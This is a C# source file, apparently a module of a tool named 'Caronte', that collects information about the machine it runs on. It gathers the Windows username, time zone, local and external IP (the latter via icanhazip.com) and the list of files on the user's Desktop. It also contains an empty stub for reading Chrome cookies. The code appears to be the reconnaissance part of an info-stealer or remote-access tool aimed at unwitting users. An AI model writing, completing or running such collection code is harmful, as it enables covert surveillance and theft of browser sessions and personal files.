using Barsa.Abstracts;
using Barsa.Interfaces;
using Barsa.Models.ClientInformation;
using Barsa.CommomResponses;
using MediatR;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte.Modules.Information.GetClientInformation
{
    public class GetClientInformationQueryHandler : HandleClientExceptions, IRequestHandler<GetClientInformationQuery, CommomMediatorResponse<ClientInformation>>, IConfigurable
    {
        private readonly InformationConfiguration informationConfiguration;

        public GetClientInformationQueryHandler(IHttpClientFactory httpClientFactory, IWebServiceURLFactory webServiceURLFactory) : base(httpClientFactory, webServiceURLFactory)
        {
            informationConfiguration = new InformationConfiguration();
        }

        public void Configure()
        {
            var configuration = informationConfiguration.GetConfiguration();
        }

        public async Task<CommomMediatorResponse<ClientInformation>> Handle(GetClientInformationQuery request, CancellationToken cancellationToken)
        {
            return new CommomMediatorResponse<ClientInformation>(new ClientInformation()
            {
                CurrentTimeZoneInfo = GetCurrentTimeZoneInfo(),
                DesktopFiles = await GetClientDesktopFiles(),
                ExternalIp = await GetExternalIp(),
                LocalIp = await GetLocalIp(),
                Username = await GetUsername()
            });
        }

        private async Task<string> GetUsername()
        {
            string userName = "";

            try
            {
                userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            }
            catch (Exception ex)
            {
                await Handle(ex);
            }

            return userName;
        }

        private TimeZoneInfo GetCurrentTimeZoneInfo() =>
            TimeZoneInfo.Local;

        private async Task<string> GetLocalIp()
        {
            var ip = "";
            try
            {
                var dns = await Dns.GetHostEntryAsync(Dns.GetHostName());

                foreach (var address in dns.AddressList)
                    if (address.AddressFamily == AddressFamily.InterNetwork)
                        ip = address.ToString();
            }
            catch (Exception ex)
            {
                await Handle(ex);
            }

            return ip;
        }

        private async Task<IPAddress> GetExternalIp()
        {
            IPAddress ipAddress = null;

            try
            {
                return IPAddress.Parse(await new WebClient().DownloadStringTaskAsync("http://icanhazip.com"));
            }
            catch (Exception ex)
            {
                await Handle(ex);
            }

            return ipAddress;
        }

        private async Task<List<string>> GetClientDesktopFiles()
        {
            List<string> desktopFiles = new();

            try
            {
                var DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                desktopFiles = Directory.GetFiles(DesktopPath).ToList();
            }
            catch (Exception ex)
            {
                await Handle(ex);
            }

            return desktopFiles;
        }

        private async Task<byte[]> GetChromeNavigatorCookie()
        {
            try
            {

            }
            catch (Exception ex)
            {
                await Handle(ex);
            }

            return new byte[0];
        }
    }
}
